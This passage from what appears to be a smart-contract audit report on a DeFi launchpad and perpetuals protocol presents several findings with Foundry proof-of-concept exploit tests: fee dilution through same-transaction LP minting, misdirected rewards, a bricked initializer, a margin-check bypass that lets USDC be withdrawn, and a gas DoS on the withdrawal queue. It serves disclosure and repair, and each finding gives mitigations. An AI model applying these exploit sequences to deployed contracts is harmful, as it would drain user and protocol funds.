import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {IUniswapV2Callee} from "@gte-univ2-core/interfaces/IUniswapV2Callee.sol";
import {IERC20} from "@gte-univ2-core/interfaces/IERC20.sol";
import {IDistributor} from "contracts/launchpad/interfaces/IDistributor.sol";

contract TestToken is IERC20 {
    string public name; string public symbol; uint8 public constant decimals = 18;
    mapping(address => uint256) public override balanceOf; mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; totalSupply += amt; emit Transfer(address(0), to, amt); }
    function transfer(address to, uint256 amt) external override returns (bool){ _transfer(msg.sender,to,amt); return true; }
    function approve(address sp, uint256 amt) external override returns (bool){ allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true; }
    function transferFrom(address from,address to,uint256 amt) external override returns (bool){ uint256 al=allowance[from][msg.sender]; require(al>=amt, "al"); if(al!=type(uint256).max) allowance[from][msg.sender]=al-amt; _transfer(from,to,amt); return true; }
    function _transfer(address from,address to,uint256 amt) internal { require(balanceOf[from]>=amt, "bal"); balanceOf[from]-=amt; balanceOf[to]+=amt; emit Transfer(from,to,amt); }
}

contract MockDistributor is IDistributor {
    function addRewards(address, address, uint128, uint128) external {}
}

contract MockFactory {
    address public feeToAddr;
    function feeTo() external view returns (address) { return feeToAddr; }
    function createPair(address t0, address t1, address lp, address dist) external returns (GTELaunchpadV2Pair p) {
        p = new GTELaunchpadV2Pair();
        p.initialize(t0, t1, lp, dist);
    }
}

contract CallbackPayer is IUniswapV2Callee {
    address public token0;
    constructor(address _token0) { token0 = _token0; }
    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external override {
        (uint256 amount0In) = abi.decode(data, (uint256));
        // Pay the exact amount0In into the pair during the callback
        IERC20(token0).transfer(msg.sender, amount0In);
    }
}

contract LaunchpadFeeManipulationTest is Test {
    MockFactory factory;
    MockDistributor dist;
    address launchpadLp = address(0x1111);
    TestToken t0; TestToken t1;

    function setUp() public {
        factory = new MockFactory();
        dist = new MockDistributor();
        t0 = new TestToken("T0","T0");
        t1 = new TestToken("T1","T1");
    }

    function _initPair(uint256 seed0, uint256 seed1) internal returns (GTELaunchpadV2Pair pair) {
        pair = factory.createPair(address(t0), address(t1), launchpadLp, address(dist));
        t0.mint(address(this), seed0);
        t1.mint(address(this), seed1);
        t0.transfer(address(pair), seed0);
        t1.transfer(address(pair), seed1);
        pair.mint(launchpadLp); // initial LP to launchpad vault
    }

    function _swapWithCallback(GTELaunchpadV2Pair pair, uint256 amount1Out, uint256 amount0In) internal returns (uint112 fee0Accrued) {
        // fund the callback payer with token0 to supply amount0In during callback
        CallbackPayer payer = new CallbackPayer(address(t0));
        t0.mint(address(payer), amount0In);
        // Perform swap: take out small amount1Out, callback sends fixed amount0In
        pair.swap(0, amount1Out, address(payer), abi.encode(amount0In));
        (uint112 acc0,,) = pair.getAccruedLaunchpadFees();
        return acc0;
    }

    function test_SameTx_TemporaryLPMint_DilutesLaunchpadFees() public {
        // Baseline pair setup
        GTELaunchpadV2Pair base = _initPair(1_000 ether, 1_000 ether);
        // Choose a modest output and a generously large input to satisfy K
        uint256 amount1Out = 1e9; // 1e-9 token1 units
        uint256 amount0In = 100 ether;
        uint112 baseAccrued0 = _swapWithCallback(base, amount1Out, amount0In);
        assertGt(uint256(baseAccrued0), 0);

        // Manipulated pair setup
        GTELaunchpadV2Pair manip = _initPair(1_000 ether, 1_000 ether);

        // Attacker temporarily inflates LP supply significantly
        address attacker = address(0xBEEF);
        t0.mint(attacker, 500_000 ether);
        t1.mint(attacker, 500_000 ether);
        vm.startPrank(attacker);
        t0.transfer(address(manip), 500_000 ether);
        t1.transfer(address(manip), 500_000 ether);
        manip.mint(attacker);
        vm.stopPrank();

        // Same swap parameters now yield dramatically smaller launchpad fee accrual
        uint112 manipAccrued0 = _swapWithCallback(manip, amount1Out, amount0In);
        assertLt(uint256(manipAccrued0), uint256(baseAccrued0) / 100); // >99x reduction

        // Clean up in same tx: attacker burns temporary LP to recover tokens
        vm.startPrank(attacker);
        uint256 lpBal = manip.balanceOf(attacker);
        manip.transfer(address(manip), lpBal);
        manip.burn(attacker);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Avoid using instantaneous totalSupply for fee-share calculation. Instead, snapshot the launchpad LP share at the end of the previous block and use that snapshot during the current block’s swaps. A minimal approach:
- Maintain snapshotSupply and snapshotLaunchpadBalance along with snapshotBlock.
- On mint/burn/sync, if block.number > snapshotBlock, update snapshots to current totalSupply and launchpad balance, and set snapshotBlock = block.number.
- In _getLaunchpadFees, compute share using the prior snapshot (if block.number == snapshotBlock, use the previous one) so same-tx LP inflations cannot affect the current swap’s fee share.
This preserves the intended “proportional to LP ownership” design while eliminating same-tx manipulation. As an alternative, fix the fee share at rewards activation or use a multi-block moving average, but the previous-block snapshot is simplest and robust.





 **Derived From** : once unlocked == true, it never returns to false

## [M-11]. Unlock makes endRewards() unreachable: rewards never terminate post-unlock enabling indefinite reward farming

## Derived From Pattern/Invariant
once unlocked == true, it never returns to false

## Exploit Type
AccountingInvariantViolation

## Location
LaunchToken.unlock

## Minimim Privilege Required
Permissionless

## Description
LaunchToken’s state machine makes unlock() a one-way flip, but the only path to end the bonding rewards is guarded by `!unlocked`. After unlock, even if `totalFeeShare` later drops to zero, `_endRewards()` is never invoked, so Launchpad.Distributor/Pair fee accrual can remain active indefinitely. Idle holders who keep their bondingShare intact can continue to claim rewards beyond the intended bonding epoch, distorting payouts and draining the rewards pool. Vulnerable snippets: in unlock():

function unlock() external onlyLaunchpad {
    unlocked = true;
    emit TransfersUnlocked(block.timestamp, _incEventNonce());
}

in _decreaseFeeShares():

if (totalFeeShare == 0 && !unlocked) _endRewards();

Because `unlocked` never goes back to false, the state transition to ‘rewards concluded’ becomes unreachable once unlocked is set. This is a StateMachine bug: the epoch transition (bonding -> post-bonding) fails to trigger reward program finalization.

## Impact
Once unlock() is called, LaunchToken can no longer reach _endRewards(), so the rewards program is never finalized automatically even when bonding shares later drop to zero. This keeps Distributor/pair accrual active past the intended bonding phase and lets holders continue to claim incentives (including ongoing AMM launchpad fees) indefinitely. This is a reward-misattribution bug, not an immediate fund theft. It requires admin intervention to stop and may deplete any pre-funded incentives if left unaddressed.

## Proof of Concept
1) Attacker buys tokens pre-unlock (minted to Launchpad, transferred to attacker). This credits attacker’s bondingShare via _increaseFeeShares.
2) Launchpad calls unlock().
3) Because `_endRewards()` is only callable when `totalFeeShare == 0 && !unlocked`, and `unlocked` is now true, there is no code path to end rewards.
4) Attacker keeps tokens idle (does not transfer). Others who transfer reduce their bondingShare via `_decreaseFeeShares`, increasing attacker’s relative share.
5) Attacker repeatedly calls Distributor.claimRewards() to siphon ongoing incentives past the intended bonding phase.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";
import {ILaunchpad} from "contracts/launchpad/interfaces/ILaunchpad.sol";

contract MockLaunchpad is ILaunchpad {
    // track per-token endRewards calls
    mapping(address => uint256) public endRewardsCalls;
    // simple stake mirror
    mapping(address => mapping(address => uint96)) public stake; // token => user => shares

    // Deploy LaunchToken from this contract so `launchpad = msg.sender` pins to this mock
    function deployToken(string memory n, string memory s, string memory u, address router) external returns (LaunchToken t) {
        t = new LaunchToken(n, s, u, router);
    }

    function mintToken(LaunchToken t, uint256 amt) external {
        t.mint(amt); // onlyLaunchpad: msg.sender=this
    }

    function transferFromLaunchpad(LaunchToken t, address to, uint256 amt) external {
        // send from launchpad (this) to user to simulate sale during bonding
        t.transfer(to, amt);
    }

    function unlockToken(LaunchToken t) external {
        t.unlock();
    }

    // ILaunchpad
    function increaseStake(address account, uint96 shares) external override {
        stake[msg.sender][account] += shares;
    }

    function decreaseStake(address account, uint96 shares) external override {
        uint96 st = stake[msg.sender][account];
        stake[msg.sender][account] = shares > st ? 0 : st - shares;
    }

    function endRewards() external override {
        // msg.sender is the LaunchToken
        endRewardsCalls[msg.sender] += 1;
    }
}

contract LaunchTokenUnlock_StateMachineTest is Test {
    address internal user1 = address(0xA11CE);
    address internal user2 = address(0xB0B);
    address internal router = address(0x111);

    MockLaunchpad internal mock;

    function setUp() public {
        mock = new MockLaunchpad();
    }

    function test_EndRewardsBecomesUnreachableAfterUnlock() public {
        // deploy token with launchpad=mock
        LaunchToken t = mock.deployToken("L", "L", "uri", router);

        // mint to launchpad and distribute to two users while locked (credits fee shares)
        mock.mintToken(t, 150);
        mock.transferFromLaunchpad(t, user1, 100);
        mock.transferFromLaunchpad(t, user2, 50);

        // sanity: totalFeeShare reflects bonding shares
        assertEq(t.totalFeeShare(), 150);
        assertEq(t.bondingShare(user1), 100);
        assertEq(t.bondingShare(user2), 50);
        assertEq(mock.endRewardsCalls(address(t)), 0);

        // unlock (one-way)
        mock.unlockToken(t);
        assertTrue(t.unlocked());

        // post-unlock: users move ALL their tokens, dropping totalFeeShare to zero
        vm.prank(user1);
        t.transfer(address(0xDEAD), 100);
        vm.prank(user2);
        t.transfer(address(0xBEEF), 50);

        // shares are fully decreased
        assertEq(t.totalFeeShare(), 0);
        assertEq(t.bondingShare(user1), 0);
        assertEq(t.bondingShare(user2), 0);

        // BUG: endRewards never called because condition requires !unlocked
        assertEq(mock.endRewardsCalls(address(t)), 0);
    }

    function test_EndRewardsTriggersPreUnlock() public {
        LaunchToken t = mock.deployToken("L2", "L2", "uri", router);
        mock.mintToken(t, 100);
        mock.transferFromLaunchpad(t, user1, 100);
        // still locked; send tokens back to launchpad to zero shares
        vm.prank(user1);
        t.transfer(address(mock), 100);
        // endRewards should have been called exactly once pre-unlock
        assertEq(t.totalFeeShare(), 0);
        assertEq(mock.endRewardsCalls(address(t)), 1);
    }
}


## Suggested Mitigation
Make reward finalization idempotent and reachable both at unlock and when shares reach zero: 1) Add a boolean rewardsEnded that is set the first time _endRewards() successfully executes; guard subsequent calls with if (!rewardsEnded). 2) In unlock(), call _endRewards() unconditionally if !rewardsEnded, so rewards stop exactly at the end of the bonding phase. 3) In _decreaseFeeShares(), remove the !unlocked guard and instead do if (totalFeeShare == 0 && !rewardsEnded) _endRewards(); This preserves the pre-unlock auto-finalization path and also handles the edge case where shares reach zero after unlock without risking a double call. Optionally, skip ILaunchpad increase/decreaseStake syncs once rewardsEnded == true to avoid post-finalization stake mutations.





 **Derived From** : Unstake path also pays rewards to msg.sender (Launchpad), not the user

## [H-12]. decreaseStake pays accrued rewards to Launchpad (msg.sender), zeroing user debt and permanently stealing user claimables

## Derived From Pattern/Invariant
Unstake path also pays rewards to msg.sender (Launchpad), not the user

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.decreaseStake

## Minimim Privilege Required
RequiresRole

## Description
Distributor.decreaseStake calls RewardsTrackerLib.unstake(account, shares) which returns the user's accrued base/quote rewards. Those amounts are then sent to msg.sender via _distributeAssets, but msg.sender is the Launchpad, not the user. At the same time, the user's reward debts are updated to the new totals, so the user cannot later claim these misdirected rewards. Vulnerable snippet:

function decreaseStake(...) external onlyLaunchpad returns (uint256 baseAmount, uint256 quoteAmount) {
    (baseAmount, quoteAmount) = rs.unstake(account, uint96(shares));
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount); // pays msg.sender (Launchpad)
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount); // Launchpad, not 'account'
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

## Impact
Both increaseStake and decreaseStake route accrued user rewards to msg.sender (the Launchpad) instead of the intended user account. At the same time, the user’s reward debts are updated, and on full unstake the shares drop to zero, making future claims impossible (claim() reverts for zero shares). This results in immediate and permanent diversion of users’ rewards to the Launchpad for every stake update. Effectively, rewards can be drained from the pool away from users during normal operations.

## Proof of Concept
1) Launchpad creates a rewards pair and stakes shares for Alice.
2) A donor adds rewards to the pool (Distributor now holds reward tokens and bumps totalPendingRewards).
3) Launchpad calls decreaseStake(launchAsset, Alice, sharesToRemove). RewardsTrackerLib.unstake returns Alice's accrued rewards.
4) _distributeAssets decreases totalPendingRewards and transfers those rewards to msg.sender (Launchpad), not Alice. Alice’s reward debts are updated to the new totals, so her pending becomes zero and she cannot claim the misdirected amount.
5) Launchpad’s token balance increases by exactly the amounts returned by decreaseStake, while Alice receives nothing.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {ERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract Distributor_Misdirect_OnDecreaseStake_Test is Test {
    Distributor dist;
    TestToken base;
    TestToken quote;

    address owner = address(this);
    address launchpad = address(0xBEEF);
    address alice = address(0xA11CE);

    function setUp() public {
        base = new TestToken("BASE", "BASE");
        quote = new TestToken("QUOTE", "QUOTE");
        dist = new Distributor();
        dist.initialize(launchpad);

        // Create rewards pair (launchAsset=base, quoteAsset=quote)
        vm.prank(launchpad);
        dist.createRewardsPair(address(base), address(quote));

        // Stake shares for Alice so totalShares > 0
        vm.prank(launchpad);
        dist.increaseStake(address(base), alice, 1000); // Alice gets 1000 shares

        // Fund rewards into Distributor
        base.mint(owner, 1_000e18);
        quote.mint(owner, 1_000e18);
        base.approve(address(dist), type(uint256).max);
        quote.approve(address(dist), type(uint256).max);
        dist.addRewards(address(base), address(quote), 100e18, 50e18); // anyone can add
    }

    function test_MisdirectedRewards_OnDecreaseStake() public {
        uint256 lpBaseBefore = base.balanceOf(launchpad);
        uint256 lpQuoteBefore = quote.balanceOf(launchpad);

        // Decrease all Alice shares; this triggers reward payout
        vm.prank(launchpad);
        (uint256 bAmt, uint256 qAmt) = dist.decreaseStake(address(base), alice, 1000);
        assertGt(bAmt, 0, "base reward must be > 0");
        // quote may be 0 if none added, but we added 50e18 so expect > 0 too
        assertGt(qAmt, 0, "quote reward must be > 0");

        // Rewards paid to Launchpad (msg.sender), NOT Alice
        assertEq(base.balanceOf(launchpad), lpBaseBefore + bAmt, "base to Launchpad");
        assertEq(quote.balanceOf(launchpad), lpQuoteBefore + qAmt, "quote to Launchpad");
        assertEq(base.balanceOf(alice), 0, "Alice received no base");
        assertEq(quote.balanceOf(alice), 0, "Alice received no quote");

        // Alice cannot later claim the misdirected rewards (shares now 0 => pending is 0)
        (uint256 pendingBase, uint256 pendingQuote) = dist.getPendingRewards(address(base), alice);
        assertEq(pendingBase, 0, "Alice pending base now zeroed");
        assertEq(pendingQuote, 0, "Alice pending quote now zeroed");
    }
}


## Suggested Mitigation
Pay stake/unstake accruals to the intended beneficiary (the account argument), not msg.sender. Implement an internal function that accepts an explicit recipient and use it consistently:

- Add: function _distributeTo(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal { if (baseAmount > 0) { _decreaseTotalPending(base, baseAmount); base.safeTransfer(recipient, baseAmount); } if (quoteAmount > 0) { _decreaseTotalPending(quote, quoteAmount); quote.safeTransfer(recipient, quoteAmount); } }
- In increaseStake/decreaseStake call: _distributeTo(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).
- In claimRewards call: _distributeTo(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).

Ensure totalPendingRewards is decreased exactly once per actual payout and leave skimExcessRewards behavior unchanged.





 **Derived From** : Launchpad initializer is permanently disabled by constructor

## [M-13]. Launchpad bricked: _disableInitializers() prevents initialize(), leaving owner and core pointers unset

## Derived From Pattern/Invariant
Launchpad initializer is permanently disabled by constructor

## Exploit Type
UpgradeabilityInitializerSafety

## Location
Launchpad.constructor / initialize

## Minimim Privilege Required
Permissionless

## Description
Launchpad uses an upgradeable-style initialize(owner, quote, curve, lpVault, data) to set the owner and critical pointers. However, its constructor calls _disableInitializers(), setting the Initializable guard to a permanently initialized state on the deployed instance. Any subsequent call to initialize() reverts. As a result, owner remains zero and currentQuoteAsset/currentBondingCurve/launchpadLPVault stay unset. Core flows are DoS'ed: launch() reverts with UninitializedQuote(), buy/sell can’t operate, and all onlyOwner admin endpoints are unreachable forever. Vulnerable snippet:

constructor(...) { ... _disableInitializers(); }
function initialize(...) external initializer { _initializeOwner(owner_); currentQuoteAsset = ...; currentBondingCurve = ...; launchpadLPVault = ...; ... }

## Impact
Permanent functional DoS of Launchpad: no token can be launched (launch() reverts with UninitializedQuote), no admin configuration possible (owner stuck at zero). Requires redeploy to recover.

## Proof of Concept
1) Attacker (any EOA) deploys/observes deployed Launchpad instance where constructor ran and _disableInitializers() locked initialization.
2) Any attempt to call initialize(...) reverts due to Initializable guard.
3) Core flow: calling launch(...) with msg.value == launchFee (default 0) reverts with UninitializedQuote() because currentQuoteAsset was never set.
4) Admin attempts (e.g., updateQuoteAsset) are impossible since owner is stuck as address(0).

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Launchpad} from "contracts/launchpad/Launchpad.sol";

contract RouterMock {
    address private _factory;
    constructor(address f) { _factory = f; }
    function factory() external view returns (address) { return _factory; }
}

contract InitDisable_DoS_Test is Test {
    Launchpad launchpad;
    RouterMock router;

    function setUp() public {
        router = new RouterMock(address(0xFACADE));
        // constructor(uniV2Router, gteRouter, clobFactory, operator, distributor)
        launchpad = new Launchpad(address(router), address(0xBEEF), address(0xDEAD), address(0xF00D), address(0xFADE));
    }

    function test_InitializeIsPermanentlyDisabledAndLaunchIsDoS() public {
        // 1) initialize() is permanently disabled by constructor's _disableInitializers()
        vm.expectRevert();
        launchpad.initialize(address(this), address(0x11), address(0x22), address(0x33), bytes(""));

        // 2) Owner remains unset (zero), bricking onlyOwner endpoints
        assertEq(launchpad.owner(), address(0));

        // 3) Core flow DoS: launch() reverts with UninitializedQuote() since currentQuoteAsset is unset
        vm.expectRevert(Launchpad.UninitializedQuote.selector);
        launchpad.launch("Test", "TST", "uri");
    }
}


## Suggested Mitigation
Deploy Launchpad behind a proxy and only call _disableInitializers() in the implementation constructor (standard pattern), or remove _disableInitializers() from the non-proxy deployment. Alternatively, move critical setup to the constructor (set owner and pointers there) and delete external initialize(). Ensure the chosen pattern is consistent across all deployments.





 **Derived From** : freeColl_after(account) == freeColl_before(account) + amount, where freeColl(x) := StorageLib.loadCollateralManager().freeCollateral[x]

## [H-14]. removeMargin bypasses maintenance-margin checks due to _getPositions off-by-one; attacker drains margin to freeCollateral and withdraws USDC

## Derived From Pattern/Invariant
freeColl_after(account) == freeColl_before(account) + amount, where freeColl(x) := StorageLib.loadCollateralManager().freeCollateral[x]

## Exploit Type
AccountingInvariantViolation

## Location
PerpManager.removeMargin

## Minimim Privilege Required
Permissionless

## Description
PerpManager.removeMargin loads the account via ClearingHouseLib.getAccount, then enforces maintenance margin with ClearingHouseLib.assertPostWithdrawalMarginRequired using the returned positions array. However, ClearingHouseLib._getPositions populates positions only for i < length - 1 when newPosition == false (as used by getAccount), leaving the last entry uninitialized (all zeros). For accounts with exactly one asset (length == 1) or for the asset that happens to be last in the set, the in-memory position is zeroed. assertPostWithdrawalMarginRequired then computes intendedMargin=0 and upnl=0, allowing removal down to zero margin while a real open position still exists on-chain. This credits freeCollateral by the requested amount (handleCollateralDelta(-amount)) without any USDC transfer, and the attacker can immediately call withdraw() to pull USDC. Additionally, removeMargin calls setPositions with tradedAsset == '', which unconditionally writes positions[i].lastCumulativeFunding for all assets; with the last entry left at its default, this resets lastCumulativeFunding for the last asset to 0, compounding accounting drift. Vulnerable snippets: PerpManager.removeMargin: (cache.assets, cache.positions) = clearingHouse.getAccount(...); clearingHouse.assertPostWithdrawalMarginRequired(..., margin: remainingMargin). ClearingHouseLib._getPositions: positions = new Position[](length); for (i < length - 1) positions[i] = ...; if (!newPosition) it never fills positions[length - 1].

## Impact
A trader with any open position whose asset is the only or the last asset in their account can bypass maintenance-margin checks in removeMargin due to an off-by-one bug in ClearingHouseLib._getPositions (last index left uninitialized when newPosition == false). This lets them convert nearly all margin to freeCollateral and then withdraw USDC, creating immediate protocol bad debt (direct funds loss). Additionally, setPositions unconditionally writes lastCumulativeFunding from the corrupted memory position for every asset, which can incorrectly overwrite funding indices and skew later funding, though the monetary loss stems from the margin bypass.

## Proof of Concept
Prerequisites: Attacker has one subaccount with at least one open position. Ensure the asset is recorded in the ClearingHouse assets set for that subaccount (assets.length == 1 or that asset is last). Steps:
- Step 1: Open a position on asset A and ensure margin > 0 for the subaccount.
- Step 2: Call PerpManager.removeMargin(account, sub, amount = full current margin). Internally, getAccount(account, sub) calls _getPositions(..., newPosition=false) which populates positions[0..length-2] only, leaving positions[length-1] uninitialized. For a single-asset account (length==1), positions[0] is all zeros.
- Step 3: assertPostWithdrawalMarginRequired computes intendedMargin, totalNotional, and upnl from the zeroed last position, yielding zeros. The check reduces to remainingMargin >= 0 and passes even though a real position exists.
- Step 4: settleMarginUpdate credits freeCollateral by amount without moving USDC.
- Step 5: The attacker calls withdraw(account, amount) to pull USDC from the vault. The position remains open but under-margined, leaving the protocol with bad debt.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {PerpManager} from "contracts/perps/PerpManager.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {ClearingHouse, ClearingHouseLib} from "contracts/perps/types/ClearingHouse.sol";
import {Market} from "contracts/perps/types/Market.sol";
import {Position} from "contracts/perps/types/Position.sol";
import {DynamicArrayLib} from "@solady/utils/DynamicArrayLib.sol";
import {OIDelta} from "contracts/perps/types/Structs.sol";

contract RemoveMarginBypassTest is Test {
    using ClearingHouseLib for ClearingHouse;

    PerpManager mgr;
    address attacker = address(0xA11CE);
    uint256 sub = 1;
    bytes32 asset = bytes32("ASSET1");

    function setUp() public {
        // Deploy PerpManager with dummy addresses; role check passes because msg.sender==account
        mgr = new PerpManager(address(0xDEAD), address(0xBEEF));

        // Seed one real open position in storage
        ClearingHouse storage ch = StorageLib.loadClearingHouse();
        Position storage ps = ch.market[asset].position[attacker][sub];
        ps.amount = 1e18;          // non-zero position
        ps.isLong = true;
        ps.leverage = 1e18;        // 1x
        ps.openNotional = 1e18;
        ps.lastCumulativeFunding = int256(5e18);

        // Register the asset in the ClearingHouse assets set for this account/subaccount
        bytes32[] memory arr = new bytes32[](1);
        arr[0] = asset;
        DynamicArrayLib.DynamicArray memory assetsWrap = DynamicArrayLib.wrap(arr);
        Position[] memory posArr = new Position[](1);
        Position memory pm;
        pm.amount = ps.amount;
        pm.isLong = ps.isLong;
        pm.leverage = ps.leverage;
        pm.openNotional = ps.openNotional;
        pm.lastCumulativeFunding = ps.lastCumulativeFunding;
        posArr[0] = pm;
        ch.updateAccount(attacker, sub, assetsWrap, posArr, asset, 0, OIDelta(0,0), false);

        // Give the subaccount some margin so removeMargin can be called
        StorageLib.loadCollateralManager().margin[attacker][sub] = int256(1_000_000);
    }

    function test_removeMargin_BypassesMaintenanceAndCreditsFreeCollateral() public {
        // Sanity: freeCollateral == 0, margin == 1_000_000
        assertEq(StorageLib.loadCollateralManager().freeCollateral[attacker], 0);
        assertEq(StorageLib.loadCollateralManager().margin[attacker][sub], int256(1_000_000));

        // Attacker withdraws entire margin to freeCollateral (risk check computed on zero position)
        vm.prank(attacker);
        mgr.removeMargin(attacker, sub, 1_000_000);

        // Post: freeCollateral credited by full amount, margin set to 0
        assertEq(StorageLib.loadCollateralManager().freeCollateral[attacker], 1_000_000);
        assertEq(StorageLib.loadCollateralManager().margin[attacker][sub], int256(0));

        // The storage position still exists (non-zero), proving margin check ignored it
        Position storage ps = StorageLib.loadClearingHouse().market[asset].position[attacker][sub];
        assertGt(ps.amount, 0);
    }
}


## Suggested Mitigation
- Fix ClearingHouseLib._getPositions to populate all indices. Replace the loop condition with i < length and remove the special-case branch that leaves positions[length-1] uninitialized when newPosition == false. Always read every positions[i] from storage.
- Alternatively, if the newPosition optimization is desired, explicitly set positions[length-1] from storage when newPosition == false.
- Consider gating ClearingHouseLib.setPositions so it only updates lastCumulativeFunding for indices actually populated/validated, or pass a proper tradedAsset and avoid writing funding for unrelated assets during margin moves.
- As defense-in-depth, recompute intended margin directly from storage for risk checks, or re-fetch positions after funding realization before asserting margin requirements.





 **Derived From** : cancelWithdrawal uses O(n) full-queue copy; gas DoS via large queue

## [H-15]. Unbounded O(n) copy in GTL.cancelWithdrawal lets any EOA gas-DoS cancels by inflating _withdrawalQueue

## Derived From Pattern/Invariant
cancelWithdrawal uses O(n) full-queue copy; gas DoS via large queue

## Exploit Type
GasGriefBlockLimit

## Location
GTL.cancelWithdrawal

## Minimim Privilege Required
Permissionless

## Description
GTL.cancelWithdrawal(id) removes a withdrawal by rebuilding the entire _withdrawalQueue in _dequeue, allocating a new array of length-1 and copying every entry except id. This is O(n) over the full queue, with memory expansion costs. Any share-holder can create a very large queue by splitting their balance into many tiny queued withdrawals. Because shares/units follow underlying decimals (e.g., USDC 6), an attacker can deposit a small amount (e.g., 1 USDC = 1,000,000 units) and enqueue 1,000,000 withdrawals of 1 share each. Then, any user trying to cancel their own withdrawal must pay for an O(n) copy that can exceed block gas limits, bricking cancelWithdrawal until admins process the queue. Vulnerable snippet:

function cancelWithdrawal(uint256 id) external {
    if (_queuedWithdrawal[id].account != msg.sender) revert NotPerpManager();
    _queuedShares[msg.sender] -= _queuedWithdrawal[id].shares;
    delete _queuedWithdrawal[id];
    _dequeue(id); // O(n) over entire queue
}

function _dequeue(uint256 id) internal {
    uint256[] memory withdrawalQueue = _withdrawalQueue;
    uint256 length = withdrawalQueue.length;
    uint256[] memory newQueue = new uint256[](length - 1);
    uint256 idx;
    for (uint256 i; i < length; ++i) {
        if (withdrawalQueue[i] != id) newQueue[idx++] = withdrawalQueue[i];
    }
    _withdrawalQueue = newQueue;
}

## Impact
An attacker can cheaply deposit a small amount of USDC (due to 6 decimals) and split it into many tiny queued withdrawals, inflating _withdrawalQueue. Both cancelWithdrawal and processWithdrawals rebuild or slice the entire queue by first copying the whole storage array to memory, causing O(n) SLOADs and memory expansion. For sufficiently large queues, both functions exceed realistic gas limits and revert, preventing users from canceling and admins from processing withdrawals. This can permanently brick withdrawal processing on-chain, effectively locking user funds until a migration/upgrade.

## Proof of Concept
Attack outline:
- Prereq: USDC has 6 decimals; GTL shares are 1:1 to assets by default. Attacker deposits 1 USDC (1,000,000 units) to mint ~1,000,000 shares.
- Attacker calls queueWithdrawal(1) repeatedly to create a very large number of 1-share entries. The contract enforces only per-account sum of shares ≤ balance, not entry count, so this is feasible on low-gas chains.
- User cancelWithdrawal(id) does a full-array rebuild via _dequeue, which copies the entire storage array into memory and then back into storage, O(n). For large n, this runs out of gas.
- Worse: Admin processWithdrawals(num) ends with _dequeueBatch(num) which also copies the entire _withdrawalQueue to memory (O(n)) regardless of num, then writes the tail slice back to storage. For large n, any attempt to process even 1 withdrawal will OOG, bricking withdrawal processing globally.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {GTL} from "contracts/perps/GTL.sol";

contract MockUSDC {
    string public constant name = "MockUSDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 value) external returns (bool) { allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; }
    function transfer(address to, uint256 value) external returns (bool) { require(balanceOf[msg.sender] >= value, "bal"); unchecked { balanceOf[msg.sender] -= value; balanceOf[to] += value; } emit Transfer(msg.sender, to, value); return true; }
    function transferFrom(address from, address to, uint256 value) external returns (bool) { require(balanceOf[from] >= value, "bal"); uint256 a = allowance[from][msg.sender]; require(a >= value, "allow"); if (a != type(uint256).max) allowance[from][msg.sender] = a - value; unchecked { balanceOf[from] -= value; balanceOf[to] += value; } emit Transfer(from, to, value); return true; }
    function mint(address to, uint256 value) external { balanceOf[to] += value; emit Transfer(address(0), to, value); }
}

// Minimal mock for IViewPort used by GTL
contract MockViewPort {
    function getFreeCollateralBalance(address) external pure returns (uint256) { return 0; }
    function getOrderbookCollateral(address, uint256) external pure returns (uint256) { return 0; }
    function getAccountValue(address, uint256) external pure returns (int256) { return 0; }
}

contract GTL_DoS_Queue_Test is Test {
    MockUSDC usdc;
    MockViewPort viewport;

    address attacker = address(0xA11CE);
    address owner = address(0xB0B);

    function setUp() public {
        usdc = new MockUSDC();
        viewport = new MockViewPort();
        // fund attacker with 1 USDC (1_000_000 units)
        usdc.mint(attacker, 1_000_000);
    }

    function _newVault() internal returns (GTL g) {
        g = new GTL(address(usdc), address(viewport));
        g.initialize(owner);
    }

    function _buildQueue(GTL g, uint256 entries) internal returns (uint256 lastId) {
        vm.startPrank(attacker);
        usdc.approve(address(g), type(uint256).max);
        g.deposit(1_000_000, attacker); // deposit 1 USDC => ~1e6 shares
        for (uint256 i; i < entries; ++i) {
            lastId = g.queueWithdrawal(1); // 1 share per entry
        }
        vm.stopPrank();
    }

    // Demonstrate linear gas growth for cancelWithdrawal with queue size
    function test_cancelWithdrawal_gas_scales_with_queue() public {
        GTL g1 = _newVault();
        uint256 id1 = _buildQueue(g1, 200);
        vm.prank(attacker);
        uint256 gasStart1 = gasleft();
        g1.cancelWithdrawal(id1);
        uint256 gasUsed1 = gasStart1 - gasleft();

        GTL g2 = _newVault();
        uint256 id2 = _buildQueue(g2, 1200);
        vm.prank(attacker);
